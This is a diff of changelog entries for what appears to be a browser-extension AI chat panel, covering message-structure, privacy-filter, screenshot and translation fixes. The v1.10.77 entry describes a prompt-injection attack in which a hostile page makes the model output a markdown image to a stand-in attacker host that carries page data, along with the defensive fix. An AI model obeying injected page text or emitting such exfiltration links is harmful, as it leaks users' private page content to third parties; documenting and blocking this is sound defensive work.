@@ -1,3 +1,22 @@
+# One system message only (v1.10.78)
+
+- `buildMessages()` used to append two or three extra `system` messages after the conversation history (page-context state, a repeated language guard, and for translations the translation protocol). Strict chat templates (some Qwen builds, certain OpenRouter backends) reject a `system` message that is not first. There is now exactly one `system` message, at the start; the per-request instructions are placed at the very start of the current user turn inside an `[INSTRUCTIONS FOR THIS REQUEST ...]` block, before the untrusted page-data block (whose random boundary the page cannot forge). Verified on the real function for page on/off/capture-failed/translate modes: system count 1, first message is system, roles alternate, the instruction block precedes the page data and the question is last. Not tested against a live Qwen/OpenRouter request.
+- Build bumped to 1.10.78.
+
+# Privacy fixes: remote images, privacy filter false positives, page screenshots (v1.10.77)
+
+- **Remote images in replies are no longer loaded automatically.** A prompt-injected page could make the model emit `![](https://attacker/?d=<page data>)` and the panel would request it as soon as the reply rendered. The panel CSP is now `img-src 'self' data:`; every remote image is shown as a placeholder (with its URL) and is fetched through the worker (`FETCH_IMAGE`, public hosts only, type/size checked) only when the user clicks it. Loaded images are cached for the session so streaming re-renders keep them. The old http-image fallback code was removed.
+- **Privacy filter false positives (`pii-filter.js`).** The "my name is / this is" rule ran with the `i` flag, so `[A-Z]` matched any letter: "This is very important for the project." became "This is [NAME] project." That rule is now case-sensitive and "this is" was dropped. Greetings (Hello/Hi/Dear) take at most two capitalised words and skip generic targets (World, Everyone, Customer Support...). Version numbers ("Version 1.2.3.4") are not treated as IP addresses. Chinese titles only match after a common surname (王先生, 李经理), not any word before 老师/经理/医生. Known limit: "my name is john smith" in lowercase is not redacted.
+- **Page screenshot and images are opt-in.** Images cannot be run through the text filter, so the quick actions no longer attach a viewport screenshot and page images unless Settings > "Page screenshot and images" is on (off by default). Images the user attaches are unchanged. `piiFilterEnabled` and `pageVisualsEnabled` are now included in the settings export/import.
+- `privacy-policy.md` now describes quick actions reading the page, the screenshot option, the privacy filter and click-to-load images.
+- Build bumped to 1.10.77.
+
+# Quick Translate follows the preferred translation language (v1.10.76)
+
+- The Translate quick action used to always ask for Chinese. It now uses Settings > Preferred Translation Language (default English), the same as the right-click menu. The API prompt names the language in English; the chat bubble shows it in the display language. `quickTranslate_prompt` in all six languages takes a `{language}` placeholder; the language lookup is shared (`getPreferredTranslationLanguage()` in `sidepanel.js`).
+- Behaviour change: users who never set the preference now get English instead of Chinese.
+- Build bumped to 1.10.76.
+
 # Page size budget per model + clearer too-large errors (v1.10.75)
 
 - **Per-model cap:** `models.js` now has `maxPageChars` (DeepSeek 120,000 chars; Groq and OpenRouter-free 24,000, roughly 6k tokens). Longer page text is cut at a line boundary in the worker and the panel shows a "page shortened" notice bubble.
